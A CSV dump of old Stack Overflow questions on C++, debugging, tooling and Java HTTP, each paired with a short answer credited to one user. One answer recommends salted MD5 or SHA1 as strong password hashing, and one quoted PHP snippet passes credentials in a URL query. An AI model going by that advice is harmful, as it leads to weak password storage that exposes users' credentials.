QUESTION,USERID,USERNAME,ANSWER
"<p>I am using VS2005 VC++ for unmanaged C++. I have VSTS and am trying to use the code coverage tool to accomplish two things with regards to unit tests:</p>

<ol>
<li>See how much of my referenced code under test is getting executed</li>
<li>See how many methods of my code under test (if any) are not unit tested at all</li>
</ol>

<p>Setting up the VSTS code coverage tool (see the <a href=""https://blogs.msdn.com/ms_joc/articles/406608.aspx"" rel=""nofollow"" title=""MSDN Code Coverage Blog"">link text</a>) and accomplishing task #1 was straightforward. However #2 has been a surprising challenge for me. Here is my test code. </p>

<pre><code>class CodeCoverageTarget
{
public:
    std::string ThisMethodRuns() {
         return ""Running"";
    }

    std::string ThisMethodDoesNotRun() {
        return ""Not Running"";
    }
};



#include &lt;iostream&gt;
#include ""CodeCoverageTarget.h""
using namespace std;
int main()

{
    CodeCoverageTarget cct; 
    cout&lt;&lt;cct.ThisMethodRuns()&lt;&lt;endl;
}
</code></pre>

<p>When both methods are defined within the class as above the compiler automatically eliminates the ThisMethodDoesNotRun() from the obj file. If I move it's definition outside the class then it is included in the obj file and the code coverage tool shows it has not been exercised at all. Under most circumstances I want the compiler to do this elimination for me but for the code coverage tool it defeats a significant portion of the value (e.g. finding untested methods). I have tried a number of things to tell the compiler to stop being smart for me and compile everything but I am stumped. It would be nice if the code coverage tool compensated for this (I suppose by scanning the source and matching it up with the linker output) but I didn't find anything to suggest it has a special mode to be turned on. Am I totally missing something simple here or is this not possible with the VC++ compiler + VSTS code coverage tool? </p>

<p>Thanks in advance,
KGB</p>
","9530","Adam Rosenfield","<p>You could try adding a line of code to call the function only if some condition is true, and guarantee that that condition will never be true.  Just make sure the compiler can't figure that out.  For example,</p>

<pre><code>
int main(int argc, char **argv)
{
  if(argv == NULL)  // C runtime says this won't happen
    someMethodWhichIsntReallyEverCalled();
}
</code></pre>
"
"<p>If I have a <code>std::vector</code> or <code>std::map</code> variable, and I want to see the contents, it's a big pain to see the nth element while debugging. Is there a plugin, or some trick to making it easier to watch STL container variables while debugging <code>(VS2003/2005/2008)</code>?</p>
","9530","Adam Rosenfield","<p>If you want to watch more than one element at the same time, you can append a comma and the number of elements as so:</p>

<p><code>(v._Myfirst)[startIndex], count</code></p>

<p>However, note that count must be a constant, it cannot be the result of another expression.</p>
"
"<p>A while ago I came across some code that marked a member variable of a class with the <code>mutable</code> keyword.  As far as I can see it simply allows you to modify a variable in a <code>const</code> method:</p>

<pre><code>class Foo  
{  
private:  
    mutable bool done_;  
public:  
    void doSomething() const { ...; done_ = true; }  
};
</code></pre>

<p>Is this the only use of this keyword or is there more to it than meets the eye?  I have since used this technique in a class, marking a <code>boost::mutex</code> as mutable allowing <code>const</code> functions to lock it for thread-safety reasons, but, to be honest, it feels like a bit of a hack.</p>
","9530","Adam Rosenfield","<p>It's useful in situations where you have hidden internal state such as a cache.  For example:</p>

<pre>
class HashTable
{
...
public:
    string lookup(string key) const
    {
        if(key == lastKey)
            return lastValue;

        string value = lookupInternal(key);

        lastKey = key;
        lastValue = value;

        return value;
    }

private:
    mutable string lastKey, lastValue;
};</pre>

<p>And then you can have a <code>const HashTable</code> object still use its <code>lookup()</code> method, which modifies the internal cache.</p>
"
"<p>I want to be able to figure out what port a particular program is using.  Are there any programs available online or that come with windows that will tell me which processes are using which ports on my computer?</p>

<p>PS - before you downmod this for not being a programming question, I'm looking for the program to test some networking code.</p>
","9530","Adam Rosenfield","<p>Windows comes with the <code>netstat</code> utility, which should do exactly what you want.</p>
"
"<p>I'm having some issues with producing an int matrix without creating memory leaks. I want to be able to make a given (global) matrix into any size dynamically via read_matrix(). But then i want to be able to free the memory later on. So in my main method the second printf should result in a bus error since it should not have any memory allocated to it. How would i go about creating this?</p>

<pre><code>int**   	first_matrix;
int**   	second_matrix;
int**   	result_matrix;

int** read_matrix(int size_x, int size_y)
{
    int** matrix;
    matrix = calloc(size_x, sizeof(int*));
    for(int i = 0;i&lt;size_x;i++) {
    	matrix[i] = calloc(size_y, sizeof(int));
    }
    for(int i = 0;i&lt;size_x;i++) {
    	for(int j = 0;j&lt;size_y;j++) {
    		matrix[i][j] = i*10+j;
    	}
    }
    return matrix;
}

int main(int stackc, char** stack)
{
    first_matrix = read_matrix(10,10);
    printf(""9:3 %d - 4:6 %d \n"", first_matrix[9][3], first_matrix[4][6]);
    free(*first_matrix);
    free(first_matrix);
    printf(""9:3 %d - 4:6 %d \n"", first_matrix[9][3], first_matrix[4][6]);
}
</code></pre>
","9530","Adam Rosenfield","<p>You need to free each row individually:</p>

<pre><code>
void free_matrix(int **matrix, int size_x)
{
    for(int i = 0; i &lt; size_x; i++)
        free(matrix[i]);
    free(matrix);
}
</code></pre>
"
"<p>While working on a tool that allows to exchange images of several third-party applications and thus creating individual ""skins"" for those applications, I have stumbled across a jpg-format about which I cannot seem to find any decent informations.</p>

<p>When looking at it in a hex-editor, it starts with the tag ""CF10"". Searching the internet has only provided a tool that is able to handle these kind of files, without any additional informations.</p>

<p>Does anyone have any further informations about this type of jpg-format?</p>
","9530","Adam Rosenfield","<p><a href=""http://linux.die.net/man/1/file"" rel=""nofollow""><code>file(1)</code></a> should give you some useful information.  You can also use ImageMagick's <a href=""http://www.imagemagick.org/script/identify.php"" rel=""nofollow""><code>identify(1)</code></a> program (optionally with the <code>-verbose</code> option) to get even more details about the file.  See the example on that page for a good idea of what information it provides.</p>
"
"<p>If I create a test suite for a development project, should those classes be kept under version control with the rest of the project code?</p>
","9530","Adam Rosenfield","<p>Yes, there is no reason not to put them in source control.  What if the tests change?  What if the interfaces change, necessitating that the tests change?</p>
"
"<p>I`d like to be able to read the content of office documents (for a custom crawler). </p>

<p>The office version that need to be readable are from 2000 to 2007. I mainly want to be crawling words, excel and powerpoint documents.</p>

<p>I don`t want to retrieve the formatting, only the text in it. </p>

<p>The crawler is based on lucene.NET if that can be of some help and is in c#.</p>

<p>I already used iTextSharp for parsing PDF</p>
","9530","Adam Rosenfield","<p><a href=""http://www.linux.com/feature/52385"" rel=""nofollow"">Here</a> is a good list of various tools for converting Word documents to plaintext, which you can then do whatever with.</p>
"
"<p>I am tasked with writing an authentication component for an open source JAVA app.  We have an in-house authentication widget that uses https.  I have some example php code that accesses the widget which uses cURL to handle the transfer.  </p>

<p>My question is whether or not there is a port of cURL to JAVA, or better yet, what base package will get me close enough to handle the task? </p>

<p><strong>Update</strong>:</p>

<p>This is in a nutshell, the code I would like to replicate in JAVA:</p>

<pre><code>$cp = curl_init();
$my_url = ""https://"" . AUTH_SERVER . ""/auth/authenticate.asp?pt1=$uname&amp;pt2=$pass&amp;pt4=full"";
curl_setopt($cp, CURLOPT_URL, $my_url);
curl_setopt($cp, CURLOPT_RETURNTRANSFER, 1);
$result = curl_exec($cp);
curl_close($cp);
</code></pre>

<p><a href=""http://stackoverflow.com/questions/116650/curl-equivalent-in-java#116725"">Heath</a>, I think you're on the right track, I think I'm going to end up using HttpsURLConnection and then picking out what I need from the response.</p>
","9530","Adam Rosenfield","<p>You can try the libcurl Java bindings: <a href=""http://curl.haxx.se/libcurl/java/"" rel=""nofollow"">http://curl.haxx.se/libcurl/java/</a>.</p>
"
"<p>Is there <em>anything</em> available that isn't trivially breakable?</p>
","9530","Adam Rosenfield","<p>Use a strong crytographic hash function like MD5 or SHA1, but make sure you use a good <a href=""http://en.wikipedia.org/wiki/Salt_(cryptography)"" rel=""nofollow"">salt</a>, otherwise you'll be susceptible to <a href=""http://en.wikipedia.org/wiki/Rainbow_table"" rel=""nofollow"">rainbow table</a> attacks.</p>
"
"<p>It's gotta be free.  It's hobby, after all, not a business!. Creating for-profit software isn't an issue, but anything that requires a hardware mod is out.</p>
","9530","Adam Rosenfield","<p>No, all of the major consoles, except for the Xbox 360, do not have open development environments.  There are various homebrew kits you can get, but these aren't sanctioned by the console makers (Nintendo, Sony, and Microsoft), so at best, you'll only be able to give away ROMs of what you make for free.  If you try to sell anything, you'll get sued into the ground.</p>
"
